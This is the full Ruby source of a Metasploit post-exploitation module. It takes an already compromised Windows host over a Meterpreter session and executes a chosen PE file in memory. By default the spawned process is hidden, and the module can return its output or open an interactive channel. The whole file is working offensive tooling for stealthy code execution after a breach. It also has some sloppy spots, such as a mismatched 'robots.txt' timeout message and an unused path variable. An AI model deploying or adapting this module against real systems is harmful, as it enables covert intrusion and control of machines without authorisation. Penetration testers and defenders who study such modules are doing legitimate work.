##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "timeout"
require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Manage Memory pe execute Module',
                      'Description'  => %q{
        This module will inject into the memory of a process a specified pe.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['viper'],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptPath.new('PE', [true, 'Path to the pe to execute']),
                    OptString.new('ARGUMENTS', [false, 'The arguments to pass to the command']),
                    OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', true]),
                    OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),
                    OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
                    OptInt.new('WAIT_OUTPUT', [true, 'Seconds to wait for process output', 3]),
            ])
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    pe          = datastore['PE']

    if File.file?(File.join(Msf::Config.loot_directory, datastore['PE']))
      @shellcode_path = File.join(Msf::Config.loot_directory, datastore['PE'])
    elsif File.file?(datastore['PE'])
      @shellcode_path = datastore['PE']
    else
      print_error("#{datastore['PE']} not found")
      return
    end



    cmd_args    = datastore['ARGUMENTS']
    hidden      = datastore['HIDDEN']
    channelized = datastore['CHANNELIZED']
    interactive = datastore['INTERACTIVE']
    p           = client.sys.process.execute(pe, cmd_args,
                                             'Channelized'    => channelized,
                                             'Desktop'        => false,
                                             'Session'        => nil,
                                             'Hidden'         => hidden,
                                             'InMemory'       => 'cmd',
                                             'UseThreadToken' => false)

    print_line("Process #{p.pid} created.")
    print_line("Channel #{p.channel.cid} created.") if (p.channel)

    if (interactive and p.channel)
      shell.interact_with_channel(p.channel)
    elsif channelized
      output = ""
      begin
        Timeout.timeout(datastore['WAIT_OUTPUT']) do
          while (tmp = p.channel.read)
            output = output +tmp
          end
        end
      rescue Timeout::Error
        vprint_status("robots.txt request timed out")
      end
      print_line(output)
    end
  end
end
